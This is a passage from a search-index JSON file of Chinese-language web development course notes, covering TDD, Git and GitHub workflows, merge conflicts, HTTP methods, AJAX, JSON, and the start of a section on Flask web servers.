\u6216\u5176\u4ed6\u76f8\u5bf9\u4f30\u7b97\u65b9\u6cd5\uff0c\u800c\u4e0d\u662f\u7cbe\u786e\u7684\u65f6\u95f4\u5355\u4f4d\u3002\u6545\u4e8b\u70b9\u7efc\u5408\u4e86\u5de5\u4f5c\u7684\u590d\u6742\u5ea6\u3001\u5de5\u4f5c\u91cf\u548c\u4e0d\u786e\u5b9a\u6027\u3002</li> <li>\u901a\u8fc7\u51e0\u4e2a\u8fed\u4ee3\u540e\uff0c\u56e2\u961f\u53ef\u4ee5\u8ba1\u7b97\u51fa\u5176Team Velocity (\u5f00\u53d1\u901f\u7387)\uff0c\u5373\u6bcf\u4e2a\u8fed\u4ee3\u80fd\u5b8c\u6210\u591a\u5c11\u6545\u4e8b\u70b9\u3002</li> <li>\u5f00\u53d1\u901f\u7387\u53ef\u4ee5\u7528\u6765\u9884\u6d4b\u672a\u6765\u8fed\u4ee3\u7684\u5de5\u4f5c\u91cf\u548c\u9879\u76ee\u5b8c\u6210\u65f6\u95f4\u3002</li> </ul>"},{"location":"cs/mern/3403/l7/#the-purpose-of-test-driven-development-tdd","title":"The purpose of test-driven development (TDD)","text":"<ul> <li>\u6838\u5fc3\u601d\u60f3\uff1a\u5728\u7f16\u5199\u5b9e\u9645\u529f\u80fd\u4ee3\u7801\u4e4b\u524d\uff0c\u5148\u7f16\u5199\u6d4b\u8bd5\u7528\u4f8b\u3002</li> <li>\u76ee\u7684\uff1a</li> <li>\u786e\u4fdd\u4ee3\u7801\u7b26\u5408\u9700\u6c42\uff1a\u901a\u8fc7\u5148\u5b9a\u4e49\u6d4b\u8bd5\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u66f4\u6e05\u6670\u5730\u7406\u89e3\u9700\u6c42\uff0c\u5e76\u7f16\u5199\u51fa\u80fd\u591f\u901a\u8fc7\u8fd9\u4e9b\u6d4b\u8bd5\u7684\u4ee3\u7801\u3002</li> <li>\u6d4b\u8bd5\u5373\u6587\u6863\uff1a\u6d4b\u8bd5\u7528\u4f8b\u672c\u8eab\u6210\u4e3a\u4e86\u7cfb\u7edf\u529f\u80fd\u7684\u4e00\u79cd\u7cbe\u786e\u63cf\u8ff0\u548c\u6587\u6863\u3002</li> <li>\u63d0\u9ad8\u4ee3\u7801\u8d28\u91cf\u548c\u53ef\u7ef4\u62a4\u6027\uff1a\u4fc3\u4f7f\u5f00\u53d1\u8005\u7f16\u5199\u6a21\u5757\u5316\u3001\u53ef\u6d4b\u8bd5\u7684\u4ee3\u7801\u3002</li> <li>\u5145\u6ee1\u4fe1\u5fc3\u5730\u8fdb\u884c\u66f4\u6539\uff1a\u5f53\u4e0e\u6301\u7eed\u96c6\u6210\u8fc7\u7a0b\u7ed3\u5408\u65f6\uff0c\u5355\u5143\u6d4b\u8bd5\u4f7f\u56e2\u961f\u80fd\u591f\u5145\u6ee1\u4fe1\u5fc3\u5730\u5bf9\u8f6f\u4ef6\u8fdb\u884c\u66f4\u6539\uff0c\u56e0\u4e3a\u6d4b\u8bd5\u53ef\u4ee5\u5feb\u901f\u53d1\u73b0\u56e0\u66f4\u6539\u5f15\u5165\u7684\u9519\u8bef\u3002</li> <li>TDD \u751f\u547d\u5468\u671f\uff1a\u6d4b\u8bd5\u5931\u8d25 -&gt; \u7f16\u5199\u4ee3\u7801\u4f7f\u6d4b\u8bd5\u901a\u8fc7 -&gt; \u91cd\u6784\u4ee3\u7801\u3002</li> </ul>"},{"location":"cs/mern/3403/l7/#the-purpose-of-version-control-software","title":"The purpose of version control software","text":"<ul> <li>\u80cc\u666f\uff1a\u5927\u578b\u8f6f\u4ef6\u5f00\u53d1\u6d89\u53ca\u591a\u4eba\u534f\u4f5c\uff0c\u5bb9\u6613\u51fa\u9519\uff0c\u4e14\u9519\u8bef\u53ef\u80fd\u5728\u6570\u5468\u6216\u6570\u6708\u540e\u624d\u88ab\u53d1\u73b0\u3002</li> <li>\u76ee\u7684\uff1a</li> <li>\u8ddf\u8e2a\u548c\u7ba1\u7406\u4ee3\u7801\u53d8\u66f4\u5386\u53f2\uff1a\u8bb0\u5f55\u6bcf\u4e00\u6b21\u5bf9\u4ee3\u7801\u7684\u4fee\u6539\u3002</li> <li>\u652f\u6301\u56e2\u961f\u534f\u4f5c\uff1a\u5141\u8bb8\u591a\u4e2a\u5f00\u53d1\u8005\u540c\u65f6\u5728\u540c\u4e00\u4e2a\u4ee3\u7801\u5e93\u4e0a\u5de5\u4f5c\u3002</li> <li>\u89e3\u51b3\u51b2\u7a81\uff1a\u63d0\u4f9b\u673a\u5236\u6765\u5904\u7406\u4e0d\u540c\u5f00\u53d1\u8005\u5bf9\u540c\u4e00\u4ee3\u7801\u90e8\u5206\u6240\u505a\u4fee\u6539\u4e4b\u95f4\u7684\u51b2\u7a81\u3002</li> <li>\u56de\u6eda\u5de5\u4f5c\uff1a\u80fd\u591f\u5c06\u4ee3\u7801\u6062\u590d\u5230\u4e4b\u524d\u7684\u67d0\u4e2a\u7a33\u5b9a\u72b6\u6001\u3002</li> <li>Git \u662f\u76ee\u524d\u4e16\u754c\u4e0a\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u7531 Linus Torvalds \u4e8e2005\u5e74\u5f00\u53d1\u3002</li> </ul>"},{"location":"cs/mern/3403/l7/#the-operation-of-a-git-project","title":"The operation of a Git project","text":"<ul> <li>Repositories (\u4ed3\u5e93)\uff1a</li> <li>Git \u9879\u76ee\u5728\u4e00\u4e2a Git repository \u4e2d\u8fdb\u884c\u5f00\u53d1\u3002</li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>git init</code> \u5728\u5f53\u524d\u6587\u4ef6\u5939\u4e2d\u521d\u59cb\u5316\u4e00\u4e2a\u65b0\u4ed3\u5e93\u3002</li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>git clone</code> \u4ece\u5176\u4ed6\u5730\u65b9\u514b\u9686\u4e00\u4e2a\u73b0\u6709\u4ed3\u5e93\uff0c\u521b\u5efa\u6240\u6709\u6587\u4ef6\u548c\u5386\u53f2\u8bb0\u5f55\u7684\u672c\u5730\u526f\u672c\u3002</li> <li>Commits (\u63d0\u4ea4)\uff1a</li> <li>\u9879\u76ee\u7684\u5386\u53f2\u8bb0\u5f55\u88ab\u6784\u9020\u6210\u4e00\u4e2a\u56fe\u7ed3\u6784\uff08\u975e\u7ebf\u6027\uff09\u3002</li> <li>\u56fe\u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9\u4ee3\u8868\u5bf9\u4ee3\u7801\u7684\u4e00\u7ec4\u66f4\u6539\uff0c\u79f0\u4e3acommit\u3002</li> <li>\u6bcf\u4e2a\u63d0\u4ea4\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u54c8\u5e0c\u503c\u4f5c\u4e3a\u5176 commit ID\u3002</li> <li>\u63d0\u4ea4\u6b65\u9aa4\uff1a<code>git add &lt;filename&gt;</code> (\u5c06\u66f4\u6539\u7684\u6587\u4ef6\u6dfb\u52a0\u5230\u6682\u5b58\u533a)\uff0c\u7136\u540e <code>git commit -m \"message\"</code> (\u5c06\u6682\u5b58\u533a\u7684\u66f4\u6539\u63d0\u4ea4\u5230\u5206\u652f)\u3002</li> <li>Commit Messages (\u63d0\u4ea4\u4fe1\u606f) \u975e\u5e38\u91cd\u8981\uff0c\u5e94\u4e0d\u4ec5\u603b\u7ed3\u66f4\u6539\u4e86\u4ec0\u4e48\uff0c\u8fd8\u8981\u8bf4\u660e\u4e3a\u4ec0\u4e48\u66f4\u6539\u3002</li> <li>Branches (\u5206\u652f)\uff1a</li> <li>\u4e00\u7cfb\u5217\u8fde\u7eed\u7684\u63d0\u4ea4\u6784\u6210\u4e00\u4e2abranch\u3002</li> <li><code>HEAD</code> \u6307\u5411\u4f60\u5f53\u524d\u6240\u5728\u7684\u5206\u652f\u3002</li> <li><code>git checkout -b &lt;branchName&gt;</code>\uff1a\u521b\u5efa\u5e76\u5207\u6362\u5230\u4e00\u4e2a\u65b0\u5206\u652f\u3002</li> <li><code>git checkout &lt;branchName&gt;</code>\uff1a\u5207\u6362\u5230\u5df2\u5b58\u5728\u7684\u5206\u652f\u3002</li> <li><code>git merge &lt;branchName&gt;</code>\uff1a\u5c06\u6307\u5b9a\u5206\u652f\u7684\u66f4\u6539\u5408\u5e76\u5230\u5f53\u524d\u5206\u652f\u3002</li> <li>\u901a\u5e38\u9879\u76ee\u6709\u4e00\u4e2a <code>main</code> \u6216 <code>master</code> \u5206\u652f\uff0c\u4ee3\u8868\u9879\u76ee\u7684\u201c\u5f53\u524d\u72b6\u6001\u201d\u3002\u65b0\u529f\u80fd\u5728\u7279\u6027\u5206\u652f\u4e0a\u5f00\u53d1\uff0c\u5b8c\u6210\u540e\u5408\u5e76\u56de\u4e3b\u5206\u652f\u3002</li> <li>Tags (\u6807\u7b7e)\uff1a</li> <li>\u7528\u4e8e\u6807\u8bb0\u5386\u53f2\u4e2d\u7684\u7279\u5b9a\u70b9\uff08\u63d0\u4ea4\uff09\uff0c\u4f8b\u5982\u7248\u672c\u53d1\u5e03\u6216\u91cd\u8981\u91cc\u7a0b\u7891\u3002</li> <li><code>git tag &lt;tagname&gt; &lt;commitId&gt;</code>\uff1a\u4e3a\u4e00\u4e2a\u7279\u5b9a\u7684\u63d0\u4ea4\u6253\u4e0a\u6807\u7b7e\u3002</li> <li>Remote repositories (\u8fdc\u7a0b\u4ed3\u5e93)\uff1a</li> <li>\u4e0e\u4f60\u4ea4\u4e92\u7684\u5176\u4ed6\u4ed3\u5e93\u526f\u672c\u79f0\u4e3aremotes\u3002</li> <li>\u514b\u9686\u4ed3\u5e93\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u6dfb\u52a0\u4e00\u4e2a\u540d\u4e3a <code>origin</code> \u7684\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u6307\u5411\u4f60\u514b\u9686\u7684\u6e90\u3002</li> <li><code>git remote add &lt;remoteName&gt; &lt;remoteURL&gt;</code>\uff1a\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u8fdc\u7a0b\u4ed3\u5e93\u3002</li> <li><code>git push &lt;remoteName&gt; &lt;branchName&gt;</code>\uff1a\u5c06\u672c\u5730\u5206\u652f\u7684\u66f4\u6539\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93\u7684\u6307\u5b9a\u5206\u652f\u3002</li> <li><code>git pull &lt;remoteName&gt;</code>\uff1a\u4ece\u8fdc\u7a0b\u4ed3\u5e93\u62c9\u53d6\u6307\u5b9a\u5206\u652f\u7684\u66f4\u6539\u5e76\u5408\u5e76\u5230\u672c\u5730\u5f53\u524d\u5206\u652f\u3002</li> </ul>"},{"location":"cs/mern/3403/l7/#merge-conflicts-and-why-they-occur","title":"Merge conflicts and why they occur","text":"<ul> <li>\u53d1\u751f\u539f\u56e0\uff1a\u5f53\u5728\u4e0d\u540c\u5206\u652f\u4e0a\u5f00\u53d1\u7684\u7279\u6027\u9700\u8981\u4fee\u6539\u540c\u4e00\u6587\u4ef6\u7684\u76f8\u540c\u4ee3\u7801\u884c\u65f6\uff0cGit \u5728\u5408\u5e76\u8fd9\u4e24\u4e2a\u5206\u652f\u65f6\u65e0\u6cd5\u81ea\u52a8\u51b3\u5b9a\u4fdd\u7559\u54ea\u4e2a\u7248\u672c\u7684\u66f4\u6539\uff0c\u4ece\u800c\u4ea7\u751f\u5408\u5e76\u51b2\u7a81\u3002</li> <li>\u89e3\u51b3\u8fc7\u7a0b\uff1a</li> <li>Git \u4f1a\u5728\u51b2\u7a81\u7684\u6587\u4ef6\u4e2d\u6807\u8bb0\u51fa\u51b2\u7a81\u7684\u90e8\u5206\u3002</li> <li>\u5f00\u53d1\u8005\u5fc5\u987b\u624b\u52a8\u7f16\u8f91\u8fd9\u4e9b\u6587\u4ef6\uff0c\u89e3\u51b3\u51b2\u7a81\uff0c\u51b3\u5b9a\u6700\u7ec8\u8981\u4fdd\u7559\u7684\u4ee3\u7801\u3002</li> <li>\u89e3\u51b3\u51b2\u7a81\u540e\uff0c\u4f7f\u7528 <code>git add &lt;filename&gt;</code> \u5c06\u4fee\u6539\u540e\u7684\u6587\u4ef6\u6807\u8bb0\u4e3a\u5df2\u89e3\u51b3\u51b2\u7a81\u3002</li> <li>\u6240\u6709\u51b2\u7a81\u6587\u4ef6\u90fd\u89e3\u51b3\u5e76\u6dfb\u52a0\u540e\uff0c\u8fd0\u884c <code>git merge --continue</code> (\u6216 <code>git commit</code> \u5728\u8f83\u65b0\u7248\u672c Git \u4e2d) \u6765\u5b8c\u6210\u5408\u5e76\u3002</li> <li>\u907f\u514d\u4e0e\u6ce8\u610f\uff1a</li> <li>\u4fdd\u6301\u63d0\u4ea4\u7684\u7c92\u5ea6\u9002\u5f53\uff08\u4f8b\u5982\uff0c\u9650\u5b9a\u4e8e\u5355\u4e2a\u7279\u6027\u6216bug\u4fee\u590d\uff09\u5e76\u7ecf\u5e38\u5408\u5e76\uff0c\u6709\u52a9\u4e8e\u51cf\u5c11\u4e25\u91cd\u51b2\u7a81\u7684\u53d1\u751f\u3002</li> <li>Git \u53ea\u80fd\u68c0\u6d4b\u5230\u8bed\u6cd5\u51b2\u7a81\uff08\u540c\u4e00\u884c\u4ee3\u7801\u88ab\u4fee\u6539\uff09\u3002\u5b83\u65e0\u6cd5\u68c0\u6d4b\u5230\u8bed\u4e49\u51b2\u7a81\uff08\u4f8b\u5982\uff0c\u4e00\u4e2a\u5206\u652f\u6539\u53d8\u4e86\u51fd\u6570\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u800c\u53e6\u4e00\u4e2a\u5206\u652f\u4f9d\u8d56\u4e8e\u5176\u65e7\u7684\u884c\u4e3a\uff09\u3002\u8bed\u4e49\u51b2\u7a81\u9700\u8981\u901a\u8fc7\u6d4b\u8bd5\u6765\u53d1\u73b0\u3002</li> </ul>"},{"location":"cs/mern/3403/l7/#the-purpose-of-github","title":"The purpose of GitHub","text":"<ul> <li>GitHub \u662f\u4e00\u4e2a\u6258\u7ba1 Git \u4ed3\u5e93\u7684\u670d\u52a1\u5e73\u53f0\u3002</li> <li>\u76ee\u7684\uff1a</li> <li>\u4ee3\u7801\u6258\u7ba1\uff1a\u4e3a Git \u4ed3\u5e93\u63d0\u4f9b\u5728\u7ebf\u5b58\u50a8\u3002</li> <li>\u534f\u4f5c\u5f00\u53d1\uff1a\u56e2\u961f\u6210\u5458\u53ef\u4ee5\u901a\u8fc7 GitHub \u4f5c\u4e3a\u9879\u76ee\u7684\u201c\u4e3b\u201d\u4ed3\u5e93\u8fdb\u884c\u534f\u4f5c\uff0c\u63a8\u9001\u548c\u62c9\u53d6\u4ee3\u7801\u3002</li> <li>\u9879\u76ee\u7ba1\u7406\uff1a\u63d0\u4f9b\u4e00\u7cfb\u5217\u5de5\u5177\u6765\u652f\u6301\u654f\u6377\u9879\u76ee\u7ba1\u7406\uff0c\u5982\u95ee\u9898\u8ddf\u8e2a\u548c\u4ee3\u7801\u5ba1\u67e5\u3002</li> <li>\u4ee3\u7801\u5171\u4eab\u4e0e\u5f00\u6e90\uff1aGitHub \u4ed3\u5e93\u53ef\u4ee5\u662f\u516c\u5f00\u7684\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u67e5\u770b\u4ee3\u7801\uff0c\u4f7f\u5176\u6210\u4e3a\u5f00\u6e90\u9879\u76ee\u7684\u91cd\u8981\u5e73\u53f0\u3002</li> <li>\u8bb8\u591a\u5176\u4ed6\u7c7b\u4f3c\u670d\u52a1\u4e5f\u5b58\u5728\uff0c\u5982 Bitbucket\u3002</li> </ul>"},{"location":"cs/mern/3403/l7/#the-different-way-of-interacting-with-a-git-project-via-github-in-an-agile-way","title":"The different way of interacting with a Git project via GitHub in an Agile way","text":"<p>GitHub \u63d0\u4f9b\u4e86\u591a\u79cd\u529f\u80fd\uff0c\u4f7f\u5f97\u56e2\u961f\u53ef\u4ee5\u66f4\u9ad8\u6548\u5730\u4ee5\u654f\u6377\u65b9\u5f0f\u8fdb\u884c\u534f\u4f5c\uff1a</p> <ul> <li>\u5171\u540c\u7684\u8fdc\u7a0b\u4ed3\u5e93\uff1a\u6240\u6709\u56e2\u961f\u6210\u5458\u901a\u8fc7\u4ece GitHub \u4ed3\u5e93 <code>pull</code> \u548c\u5411\u5176 <code>push</code> \u4ee3\u7801\u6765\u540c\u6b65\u5de5\u4f5c\u3002</li> <li>Issues (\u8bae\u9898)\uff1a</li> <li>\u7528\u4e8e\u8ddf\u8e2a\u548c\u8ba8\u8bba\u529f\u80fd\u5217\u8868 (\u7528\u6237\u6545\u4e8b)\u3001bug \u62a5\u544a\u3001\u4efb\u52a1\u548c\u6539\u8fdb\u5efa\u8bae\u3002</li> <li>\u5728\u5f00\u53d1\u65b0\u529f\u80fd\u524d\uff0c\u5e94\u521b\u5efa\u4e00\u4e2a Issue \u6765\u89c4\u5212\u548c\u8bb0\u5f55\u5b83\uff0c\u5185\u5bb9\u5305\u62ec\u5176\u76ee\u7684\u548c\u5efa\u8bae\u7684\u5b9e\u73b0\u65b9\u5f0f\u3002</li> <li>\u5bf9\u4e8e bug \u62a5\u544a\uff0cIssue \u5e94\u5305\u542b\u9884\u671f\u884c\u4e3a\u3001\u5b9e\u9645\u884c\u4e3a\u3001\u91cd\u73b0\u6b65\u9aa4\u4ee5\u53ca\u53ef\u80fd\u7684\u539f\u56e0\u3002</li> <li>Issue \u5e94\u5305\u542b\u8db3\u591f\u7ec6\u8282\uff0c\u4ee5\u4fbf\u56e2\u961f\u4e2d\u4efb\u4f55\u4eba\u90fd\u80fd\u7406\u89e3\u5e76\u5904\u7406\u3002</li> <li>Issue \u4e5f\u4f5c\u4e3a\u56e2\u961f\u8ba8\u8bba\u7684\u8bba\u575b\u3002</li> <li>Pull requests (PRs / \u62c9\u53d6\u8bf7\u6c42)\uff1a</li> <li>\u4e00\u79cd\u66f4\u4f73\u7684\u5de5\u4f5c\u6d41\u7a0b\u662f\uff0c\u5c06\u7279\u6027\u5206\u652f\u63a8\u9001\u5230 GitHub \u4ed3\u5e93\uff08\u4e0d\u5148\u5728\u672c\u5730\u5408\u5e76\u5230 <code>main</code>\uff09\uff0c\u7136\u540e\u521b\u5efa\u4e00\u4e2a\u62c9\u53d6\u8bf7\u6c42\u3002</li> <li>\u62c9\u53d6\u8bf7\u6c42\u5141\u8bb8\u5176\u4ed6\u56e2\u961f\u6210\u5458\u5728\u4ee3\u7801\u5408\u5e76\u5230\u4e3b\u5206\u652f\u4e4b\u524d\u5bf9\u5176\u8fdb\u884c\u4ee3\u7801\u5ba1\u67e5 (Code Review)\uff0c\u63d0\u51fa\u6539\u8fdb\u5efa\u8bae\u3002</li> <li>GitHub \u4f1a\u663e\u793a PR \u4e2d\u7684\u6240\u6709\u66f4\u6539\uff0c\u5176\u4ed6\u4eba\u53ef\u4ee5\u6dfb\u52a0\u8bc4\u8bba\u548c\u5efa\u8bae\u3002\u5f00\u53d1\u8005\u53ef\u4ee5\u6839\u636e\u53cd\u9988\u66f4\u65b0 PR\uff08\u901a\u8fc7\u5411\u5176\u7279\u6027\u5206\u652f\u6dfb\u52a0\u65b0\u7684\u63d0\u4ea4\u5e76\u63a8\u9001\uff09\u3002</li> <li>\u5f53\u6240\u6709\u4eba\u90fd\u6ee1\u610f\u540e\uff0cPR \u53ef\u4ee5\u88ab\u5408\u5e76\u5230\u4e3b\u5206\u652f\u3002</li> <li>README.md \u6587\u4ef6\uff1a</li> <li>\u6309\u7167\u60ef\u4f8b\uff0cGitHub \u4ed3\u5e93\u4f1a\u5305\u542b\u4e00\u4e2a\u7528 Markdown \u7f16\u5199\u7684 <code>README.md</code> \u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u5982\u4f55\u6784\u5efa/\u8fd0\u884c\u9879\u76ee\u7684\u8bf4\u660e\u3002</li> <li>GitHub \u4f1a\u81ea\u52a8\u5728\u4ed3\u5e93\u7684\u767b\u9646\u9875\u9762\u6e32\u67d3\u8fd9\u4e2a\u6587\u4ef6\u3002</li> </ul>"},{"location":"cs/mern/3403/l8/","title":"8.0 Communicating With A Server","text":""},{"location":"cs/mern/3403/l8/#high-level-structure-of-http-requests-and-responses","title":"High-level structure of HTTP requests and responses","text":"<p>HTTP \u8bf7\u6c42\u548c\u54cd\u5e94\u9075\u5faa\u7279\u5b9a\u7ed3\u6784\u3002\u8bf7\u6c42\u901a\u5e38\u5305\u542b\u65b9\u6cd5\u5b57\u6bb5\uff08\u5982 <code>GET</code>\u3001<code>POST</code>\u3001<code>PUT</code>\u3001<code>DELETE</code>\uff09\u3001URL\u3001\u5934\u90e8\uff08header\uff09\u548c\u6d88\u606f\u4f53\uff08message body\uff09\u3002\u54cd\u5e94\u62a5\u544a\u72b6\u6001\uff08\u5982 200 \u8868\u793a\u6210\u529f\uff0c404 \u8868\u793a\u672a\u627e\u5230\uff09\uff0c\u540c\u6837\u5305\u542b\u5934\u90e8\u548c\u6d88\u606f\u4f53\u3002\u5728 JavaScript \u4e2d\u5904\u7406\u54cd\u5e94\u65f6\uff0c\u53ef\u4ee5\u8bbf\u95ee <code>status</code>\u3001<code>statusText</code> \u4ee5\u53ca\u5305\u542b\u952e\u503c\u5bf9\u7684 <code>header</code> \u7b49\u5c5e\u6027\u3002\u8bf7\u6c42\u7684 <code>readyState</code> \u5c5e\u6027\u63cf\u8ff0\u4e86\u8bf7\u6c42\u7684\u8fdb\u5ea6\u3002</p>"},{"location":"cs/mern/3403/l8/#how-http-requests-allow-communication-between-the-browser-and-server","title":"How HTTP requests allow communication between the browser and server","text":"<p>\u6d4f\u89c8\u5668\u4f5c\u4e3a\u5ba2\u6237\u7aef\uff0c\u53d1\u9001 HTTP \u8bf7\u6c42\u5230\u670d\u52a1\u5668\u3002\u670d\u52a1\u5668\u63a5\u6536\u8bf7\u6c42\u3001\u5904\u7406\u540e\u751f\u6210\u54cd\u5e94\u5e76\u8fd4\u56de\u3002\u8fd9\u79cd\u8bf7\u6c42-\u54cd\u5e94\u5faa\u73af\u662f\u6d4f\u89c8\u5668\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u8fdb\u884c\u4fe1\u606f\u4ea4\u6362\u7684\u57fa\u7840\u65b9\u5f0f\u3002HTTP \u534f\u8bae\u662f\u65e0\u72b6\u6001\u7684\uff08stateless\uff09\uff0c\u670d\u52a1\u5668\u5728\u53d1\u9001\u54cd\u5e94\u540e\u4e0d\u4f1a\u4fdd\u7559\u8be5\u4ea4\u6362\u7684\u4fe1\u606f\u3002</p>"},{"location":"cs/mern/3403/l8/#purpose-of-http-request-methods","title":"Purpose of HTTP request methods","text":"<p>HTTP \u5b9a\u4e49\u4e86\u591a\u79cd\u6807\u51c6\u8bf7\u6c42\u65b9\u6cd5\uff0c\u7528\u4e8e\u6307\u660e\u5ba2\u6237\u7aef\u5e0c\u671b\u5bf9\u670d\u52a1\u5668\u8d44\u6e90\u6267\u884c\u7684\u64cd\u4f5c\u7c7b\u578b\uff1a</p> <ul> <li>GET\uff1a\u7528\u4e8e\u4ece\u670d\u52a1\u5668\u68c0\u7d22\u6570\u636e\uff08\u5982\u52a0\u8f7d\u7f51\u9875\uff09\u3002</li> <li>POST\uff1a\u7528\u4e8e\u5728\u670d\u52a1\u5668\u4e0a\u521b\u5efa\u6216\u4fee\u6539\u6570\u636e\uff08\u5982\u63d0\u4ea4\u8868\u5355\uff09\u3002</li> <li>PUT\uff1a\u7528\u4e8e\u66ff\u6362\u670d\u52a1\u5668\u4e0a\u7684\u6570\u636e\uff0c\u5fc5\u987b\u662f\u5e42\u7b49\u7684\uff08idempotent\uff09\u3002</li> <li>DELETE\uff1a\u7528\u4e8e\u5220\u9664\u670d\u52a1\u5668\u4e0a\u7684\u6570\u636e\u3002</li> </ul> <p>HTTP \u65b9\u6cd5\u5b57\u6bb5\u672c\u8eab\u53ea\u662f\u5b57\u7b26\u4e32\uff0c\u5177\u4f53\u542b\u4e49\u7531\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7ea6\u5b9a\u3002</p>"},{"location":"cs/mern/3403/l8/#the-purpose-of-asynchronous-communication-and-callbacks","title":"The purpose of asynchronous communication and callbacks","text":"<p>JavaScript \u652f\u6301\u5f02\u6b65\u64cd\u4f5c\uff0c\u4e3b\u8981\u76ee\u7684\u662f\u9632\u6b62\u6d4f\u89c8\u5668\u5728\u7b49\u5f85\u670d\u52a1\u5668\u54cd\u5e94\u65f6\u754c\u9762\u51bb\u7ed3\u6216\u963b\u585e\u5176\u4ed6\u811a\u672c\u7684\u6267\u884c\u3002\u901a\u8fc7\u5f02\u6b65\u65b9\u5f0f\u53d1\u9001\u8bf7\u6c42\uff0cJavaScript \u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u5176\u4ed6\u4efb\u52a1\u3002\u56de\u8c03\u51fd\u6570\uff08callback function\uff09\u662f\u5b9e\u73b0\u5f02\u6b65\u901a\u4fe1\u7684\u5e38\u89c1\u673a\u5236\u3002\u4f8b\u5982\uff0c<code>XMLHttpRequest</code> \u4f7f\u7528 <code>onreadystatechange</code>\uff0c<code>fetch</code> API \u4f7f\u7528 <code>.then()</code> \u548c <code>.catch()</code>\u3002</p>"},{"location":"cs/mern/3403/l8/#purpose-and-structure-of-an-ajax-request","title":"Purpose and structure of an AJAX request","text":"<p>AJAX\uff08Asynchronous JavaScript And XML\uff09\u662f\u4e00\u79cd\u65b9\u6cd5\u6216\u6a21\u5f0f\uff0c\u4e0d\u662f\u5355\u4e00\u6280\u672f\u3002AJAX \u7684\u76ee\u7684\u662f\u901a\u8fc7\u5411\u670d\u52a1\u5668\u53d1\u9001\u5f02\u6b65 HTTP \u8bf7\u6c42\uff0c\u63a5\u6536\u7ed3\u6784\u5316\u6570\u636e\uff08\u5982 XML \u6216 JSON\uff09\uff0c\u7528 JavaScript \u89e3\u6790\u5e76\u52a8\u6001\u3001\u90e8\u5206\u5730\u66f4\u65b0\u7f51\u9875\u5185\u5bb9\uff0c\u65e0\u9700\u91cd\u65b0\u52a0\u8f7d\u6574\u4e2a\u9875\u9762\u3002\u6bcf\u6b21 AJAX \u8bf7\u6c42\u90fd\u662f\u72ec\u7acb\u7684\u5f02\u6b65 HTTP \u4ea4\u6362\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u901a\u5e38\u662f\u7ed3\u6784\u5316\u5bf9\u8c61\uff08\u5982 JSON\uff09\u3002</p>"},{"location":"cs/mern/3403/l8/#purpose-of-json","title":"Purpose of JSON","text":"<p>JSON\uff08JavaScript Object Notation\uff09\u4e3b\u8981\u7528\u4e8e\u5b58\u50a8\u548c\u8868\u793a\u7ed3\u6784\u5316\u6570\u636e\uff0c\u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7684\u6570\u636e\u4ea4\u6362\u683c\u5f0f\u3002JSON \u662f JavaScript \u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u4f20\u8f93\u6570\u636e\u7684\u5e38\u7528\u683c\u5f0f\uff0c\u6bd4 XML \u66f4\u7b80\u6d01\uff0c\u652f\u6301\u6570\u7ec4\uff0c\u4f46\u4e0d\u5305\u542b\u51fd\u6570\u5b9a\u4e49\u3002\u63a5\u6536\u5230\u7684 JSON \u5b57\u7b26\u4e32\u53ef\u7528 <code>JSON.parse</code> \u8f6c\u6362\u4e3a JavaScript \u5bf9\u8c61\uff0c\u4fbf\u4e8e\u66f4\u65b0\u7f51\u9875\u5185\u5bb9\u3002</p>"},{"location":"cs/mern/3403/l9/","title":"9.0 Flask and Server-Side Rendering","text":""},{"location":"cs/mern/3403/l9/#what-is-a-web-server","title":"What is a web server?","text":"<ul> <li>Web Server: \u4e00\u4e2a\u5728\u8fde\u63a5\u5230\u4e92\u8054\u7f51\u7684\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u7684\u7a0b\u5e8f\uff0c\u5b83\u54cd\u5e94\u6765\u81ea\u7f51\u7edc\u4e0a\u5176\u4ed6\u8ba1\u7b97\u673a\uff08\u5ba2\u6237\u7aef\uff09\u7684\u8bf7\u6c42 [cite: 3]\u3002</li> <li>\u901a\u5e38\uff0cWeb \u670d\u52a1\u5668\u4f1a\u76d1\u542c\u7279\u5b9a\u7684\u7f51\u7edc\u7aef\u53e3\uff0c\u7b49\u5f85\u5ba2\u6237\u7aef\u901a\u8fc7 HTTP (Hypertext Transfer Protocol) \u6216 HTTPS (Secure HTTP) \u53d1\u9001\u8bf7\u6c42\u3002</li> <li>\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u670d\u52a1\u5668\u4f1a\u5904\u7406\u8be5\u8bf7\u6c42\uff08\u4f8b\u5982\uff0c\u68c0\u7d22\u6587\u4ef6\u3001\u8fd0\u884c\u811a\u672c\u3001\u67e5\u8be2\u6570\u636e\u5e93\uff09\uff0c\u7136\u540e\u5c06 HTTP \u54cd\u5e94\u53d1\u9001\u56de\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u901a\u5e38\u662f\u7f51\u9875\u6d4f\u89c8\u5668\u3002</li> <li>\u670d\u52a1\u5668\u7aef\u7684 Web \u5f00\u53d1\u5f88\u591a\u65f6\u5019\u662f\u5728\u547d\u4ee4\u884c\u5b8c\u6210\u7684\uff0c\u56e0\u4e3a\u4f20\u7edf\u4e0a\u670d\u52a1\u5668\u4e0d\u9700\u8981\u56fe\u5f62\u7528\u6237\u754c\u9762 [cite: 3]\u3002</li> </ul>"},{"location":"cs/mern/3403/l9/#full-stack-development","title":"Full-stack development","text":"<ul> <li>Full-stack development: \u6307\u7684\u662f Web 